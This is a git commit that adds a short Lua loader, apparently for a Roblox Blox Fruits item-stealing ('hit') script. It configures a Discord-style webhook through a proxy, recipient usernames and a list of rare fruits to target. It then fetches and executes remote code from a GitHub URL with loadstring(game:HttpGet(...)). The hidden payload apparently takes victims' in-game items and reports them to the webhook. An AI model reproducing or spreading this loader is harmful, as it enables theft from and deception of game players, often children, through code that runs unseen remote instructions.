5c38f3d53a8a02b3a33078a8b7ac0783b0caeddf
Realwazure <adriananotog50@gmail.com>
2025-03-09 13:12:15 +0530

    Create Realwazure.lua

---
+++ Realwazure.lua
@@ -0,0 +1,5 @@
+Webhook = "https://webhook-protect.vercel.app/api/webhook?id=UDlBdEpoZF9KbnlzNk9xMEpKSHVuQTpJZk9rT3ZqUFFqU3RIem1lUkltVTJ1Ul94b1U1M0RqbmlwSzRkMkFvUmhDRXBJaUVYbWJsaXJ0dVB1ejRsYzFtSW9sZmtBbW02UWV4eGx5WkVoVlFITU5idXpiMmhFeExiR3hZYWgzVGZOU291OG9UOV9BSDlmMzV5TmVJb0tzSFdUTjdycUdPSm5QTzB3WjdDRms5YUZqdkJnOUdZUUxDSm1VVF96c1NQR28" -- << Your Webhook
+Usernames = {"slayer_op75", "KingIsBackToWinn"} -- << Your username(-s).
+FruitsToHit = {"Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas","Control-Control","Dough-Dough"} -- << Fruits you want
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/surelyco/CutestCodes/refs/heads/main/V2"))()
